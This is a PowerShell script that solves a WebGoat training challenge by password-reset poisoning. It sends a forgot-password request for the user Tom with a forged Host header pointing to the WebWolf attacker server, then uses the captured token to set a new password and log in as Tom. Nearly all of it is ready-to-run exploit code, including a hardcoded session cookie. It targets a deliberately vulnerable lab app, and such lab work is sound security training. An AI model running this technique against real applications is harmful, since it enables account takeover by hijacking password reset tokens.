# ============================================================
# PASSWORD RESET - HOST HEADER MANIPULATION ATTACK
# WebGoat Challenge: ResetLinkAssignmentForgotPassword
# ============================================================

$webGoatBase = "http://192.168.254.112:8001"
$webWolfBase = "http://192.168.254.112:8002"
$sessionCookie = "25A6B220A4CB5215EBBE7B31E207B4B1"
$targetEmail = "tom@webgoat-cloud.org"

Write-Host "============================================================" -ForegroundColor Cyan
Write-Host "PASSWORD RESET - HOST HEADER MANIPULATION ATTACK" -ForegroundColor Cyan
Write-Host "============================================================`n" -ForegroundColor Cyan

# Step 1: Request password reset with manipulated Host header
Write-Host "[STEP 1] Requesting password reset for Tom with manipulated Host header..." -ForegroundColor Yellow
Write-Host "Target Email: $targetEmail" -ForegroundColor White
Write-Host "Malicious Host: 192.168.254.112:8002 (WebWolf)`n" -ForegroundColor White

try {
    $headers = @{
        "Host" = "192.168.254.112:8002"  # This will make the reset link point to WebWolf
        "Content-Type" = "application/x-www-form-urlencoded"
        "Cookie" = "JSESSIONID=$sessionCookie"
        "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    }
    
    $body = "email=$targetEmail"
    
    # Send request to the ForgotPassword endpoint (assignment ID 77)
    $resetEndpoint = "$webGoatBase/WebGoat/PasswordReset/ForgotPassword/create-password-reset-link"
    
    Write-Host "Sending POST to: $resetEndpoint" -ForegroundColor Gray
    Write-Host "With Host header: 192.168.254.112:8002" -ForegroundColor Gray
    Write-Host "Body: $body`n" -ForegroundColor Gray
    
    $response = Invoke-WebRequest -Uri $resetEndpoint `
        -Method POST `
        -Headers $headers `
        -Body $body `
        -UseBasicParsing
    
    Write-Host "✓ Request sent successfully!" -ForegroundColor Green
    Write-Host "Status Code: $($response.StatusCode)" -ForegroundColor Green
    
    $responseContent = $response.Content | ConvertFrom-Json
    Write-Host "`nResponse:" -ForegroundColor Yellow
    Write-Host ($responseContent | ConvertTo-Json -Depth 5) -ForegroundColor White
    
    if ($responseContent.lessonCompleted -eq $true) {
        Write-Host "`n✓✓✓ CHALLENGE SOLVED! ✓✓✓" -ForegroundColor Green
        Write-Host "The server accepted the manipulated Host header!" -ForegroundColor Green
    } else {
        Write-Host "`nChallenge feedback: $($responseContent.feedback)" -ForegroundColor Yellow
    }
    
} catch {
    Write-Host "✗ Error sending request: $_" -ForegroundColor Red
    Write-Host "Error Details: $($_.Exception.Message)" -ForegroundColor Red
}

Write-Host "`n============================================================" -ForegroundColor Cyan
Write-Host "[STEP 2] Check WebWolf for incoming reset token" -ForegroundColor Yellow
Write-Host "============================================================`n" -ForegroundColor Cyan

Write-Host "Now you need to:" -ForegroundColor White
Write-Host "1. Open WebWolf in your browser: $webWolfBase" -ForegroundColor White
Write-Host "2. Navigate to 'Incoming requests' or 'Mail' section" -ForegroundColor White
Write-Host "3. Look for Tom's password reset link" -ForegroundColor White
Write-Host "4. Extract the reset token from the URL" -ForegroundColor White
Write-Host "5. Use that token to reset Tom's password`n" -ForegroundColor White

Write-Host "Expected reset link format:" -ForegroundColor Gray
Write-Host "http://192.168.254.112:8002/WebGoat/PasswordReset/reset/reset-password/TOKEN_HERE`n" -ForegroundColor Gray

# Step 3: Wait for user to get the token
Write-Host "`n============================================================" -ForegroundColor Cyan
Write-Host "[STEP 3] Reset Tom's password using captured token" -ForegroundColor Yellow
Write-Host "============================================================`n" -ForegroundColor Cyan

$token = Read-Host "Enter the reset token you captured from WebWolf (or press Enter to skip)"

if ($token -and $token.Trim() -ne "") {
    Write-Host "`nResetting password with token: $token" -ForegroundColor Yellow
    
    try {
        $resetHeaders = @{
            "Content-Type" = "application/x-www-form-urlencoded"
            "Cookie" = "JSESSIONID=$sessionCookie"
        }
        
        $newPassword = "newpassword123"
        $resetBody = "token=$token&password=$newPassword"
        
        $resetPasswordEndpoint = "$webGoatBase/WebGoat/PasswordReset/reset/reset-password/$token"
        
        Write-Host "Sending POST to: $resetPasswordEndpoint" -ForegroundColor Gray
        Write-Host "New password: $newPassword`n" -ForegroundColor Gray
        
        $resetResponse = Invoke-WebRequest -Uri $resetPasswordEndpoint `
            -Method POST `
            -Headers $resetHeaders `
            -Body $resetBody `
            -UseBasicParsing
        
        Write-Host "✓ Password reset successful!" -ForegroundColor Green
        Write-Host "Response: $($resetResponse.Content)" -ForegroundColor White
        
        # Step 4: Login as Tom
        Write-Host "`n============================================================" -ForegroundColor Cyan
        Write-Host "[STEP 4] Logging in as Tom with new password" -ForegroundColor Yellow
        Write-Host "============================================================`n" -ForegroundColor Cyan
        
        $loginHeaders = @{
            "Content-Type" = "application/x-www-form-urlencoded"
            "Cookie" = "JSESSIONID=$sessionCookie"
        }
        
        $loginBody = "email=$targetEmail&password=$newPassword"
        $loginEndpoint = "$webGoatBase/WebGoat/PasswordReset/reset/login"
        
        Write-Host "Attempting login..." -ForegroundColor Gray
        
        $loginResponse = Invoke-WebRequest -Uri $loginEndpoint `
            -Method POST `
            -Headers $loginHeaders `
            -Body $loginBody `
            -UseBasicParsing
        
        $loginResult = $loginResponse.Content | ConvertFrom-Json
        
        Write-Host "`nLogin Response:" -ForegroundColor Yellow
        Write-Host ($loginResult | ConvertTo-Json -Depth 5) -ForegroundColor White
        
        if ($loginResult.lessonCompleted -eq $true) {
            Write-Host "`n✓✓✓ FULL CHALLENGE COMPLETED! ✓✓✓" -ForegroundColor Green
            Write-Host "Successfully hijacked Tom's password reset!" -ForegroundColor Green
        } else {
            Write-Host "`nLogin feedback: $($loginResult.feedback)" -ForegroundColor Yellow
        }
        
    } catch {
        Write-Host "✗ Error: $_" -ForegroundColor Red
        Write-Host "Error Details: $($_.Exception.Message)" -ForegroundColor Red
    }
} else {
    Write-Host "`nManual steps:" -ForegroundColor Yellow
    Write-Host "1. Get token from WebWolf" -ForegroundColor White
    Write-Host "2. POST to: $webGoatBase/WebGoat/PasswordReset/reset/reset-password/TOKEN" -ForegroundColor White
    Write-Host "   Body: token=TOKEN&password=newpassword123" -ForegroundColor White
    Write-Host "3. POST to: $webGoatBase/WebGoat/PasswordReset/reset/login" -ForegroundColor White
    Write-Host "   Body: email=$targetEmail&password=newpassword123`n" -ForegroundColor White
}

Write-Host "`n============================================================" -ForegroundColor Cyan
Write-Host "Script completed!" -ForegroundColor Cyan
Write-Host "============================================================`n" -ForegroundColor Cyan
